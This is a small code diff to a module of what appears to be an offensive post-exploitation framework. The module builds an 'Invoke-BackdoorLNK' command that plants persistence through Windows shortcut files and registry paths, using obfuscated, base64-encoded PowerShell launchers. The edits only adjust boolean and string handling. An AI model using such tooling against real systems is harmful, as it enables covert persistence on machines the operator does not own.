@@ -32,7 +32,7 @@ class Module:
         user_agent = params["UserAgent"]
         proxy = params["Proxy"]
         proxy_creds = params["ProxyCreds"]
-        launcher_obfuscate = params["Obfuscate"].lower() == "true"
+        launcher_obfuscate = params["Obfuscate"]
         launcher_obfuscate_command = params["ObfuscateCommand"]
 
         status_msg = ""
@@ -57,7 +57,7 @@ class Module:
 
         script_end = "Invoke-BackdoorLNK "
 
-        if cleanup.lower() == "true":
+        if cleanup:
             script_end += " -CleanUp"
             script_end += f" -LNKPath '{lnk_path}'"
             script_end += f" -RegPath '{reg_path}'"
@@ -72,7 +72,7 @@ class Module:
                     file_data = ext_path.read_text()
 
                     # unicode-base64 encode the script for -enc launching
-                    encScript = helpers.enc_powershell(file_data)
+                    encScript = helpers.enc_powershell(file_data).decode("UTF-8")
                     status_msg += "using external file " + ext_file
 
                 else:
